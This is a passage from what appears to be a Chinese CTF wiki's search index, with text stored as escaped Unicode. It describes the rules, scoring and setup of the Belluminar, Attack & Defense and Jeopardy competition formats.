\u00b6 \u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u6587\u6863\u4e2d\u8981\u6c42\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5982\u679c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u4ee5\u89e3\u51b3\u95ee\u9898\u3002\u6700\u7ec8\u653e\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002 \u89e3\u9898\u7ade\u6280 \u00b6 \u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002 \u5206\u4eab\u8ba8\u8bba \u00b6 \u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u5206\u4eab\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u591a\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002 \u8ba1\u5206\u89c4\u5219 \u00b6 \u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u5ea6\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u7684\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1a Score = MaxScore -- | N -- Expect\uff3fN | \u3002N\u4ee3\u8868\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002 \u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002 \u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\u5f97\u51fa\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u4f1a\u8ba1\u7b97\u5e73\u5747\u503c\u3002 \u8d5b\u5236\u603b\u8bc4 \u00b6 \u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u63d0\u9ad8\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u53ef\u4ee5\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002 \u653b\u9632\u6a21\u5f0f - Attack & Defense \u00b6 \u6982\u8ff0 \u00b6 \u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u4e00\u822c\u6765\u8bf4\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff0c\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u53ef\u4ee5\u5f97\u5206\uff09\u3002 \u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c \u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002 \u57fa\u672c\u89c4\u5219 \u00b6 \u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b \u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206 \u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag \u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u6570\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b \u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002 \u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002 \u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002 \u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5 \u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u5bfc\u81f4\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1 \u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u88ab\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c \u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002 \u7f51\u7edc\u73af\u5883 \u00b6 \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002 \u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002 \u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740 \u7f51\u5173 \u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740 \u653b\u9632\u73af\u5883 Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002 \u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002 \u4e3b\u529e\u65b9\u73af\u5883 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u63d0\u4ea4 flag \u63a5\u53e3 \u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3 \u8bbf\u95ee Gamebox \u00b6 \u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b \u7528\u6237\u540d\u4e3a ctf \u4e00\u822c\u4f1a\u901a\u8fc7 ssh \u767b\u5f55\uff0c\u767b\u5f55\u65b9\u5f0f\u4e3a\u5bc6\u7801\u6216\u8005\u79c1\u94a5\u3002 \u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002","title":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb"},{"location":"introduction/mode/#ctf","text":"","title":"CTF \u7ade\u8d5b\u6a21\u5f0f\u7b80\u4ecb"},{"location":"introduction/mode/#-jeopardy","text":"\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u7c7b\u4f3c\u4e8e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u6797\u5339\u514b\u8d5b\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u8fdb\u884c\u6392\u540d\u3002 \u4e0d\u540c\u7684\u662f\u8fd9\u4e2a\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002","title":"\u89e3\u9898\u6a21\u5f0f - Jeopardy"},{"location":"introduction/mode/#-belluminar","text":"\u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u4e2d\u56fd\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/","title":"\u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar"},{"location":"introduction/mode/#_1","text":"Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u5206\u4eab\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\uff0c\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002","title":"\u8d5b\u5236\u4ecb\u7ecd"},{"location":"introduction/mode/#_2","text":"\u6bcf\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u51fa\u4e24\u4e2aChallenge\u5230challenge\u9898\u5e93 \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa 2 \u9053Challange\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907Challenge\u3002\u51faChallenge\u7684\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053Challenge\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2aChallenge\u5219\u4e3a\u975e Linux \u5e73\u53f0\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5bChallenge\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51faChallenge\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684Challenge\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002","title":"\u51fa\u9898\u9636\u6bb5"},{"location":"introduction/mode/#_3","text":"\u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u6587\u6863\u4e2d\u8981\u6c42\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5982\u679c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u4ee5\u89e3\u51b3\u95ee\u9898\u3002\u6700\u7ec8\u653e\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002","title":"\u63d0\u4ea4\u90e8\u7f72"},{"location":"introduction/mode/#_4","text":"\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 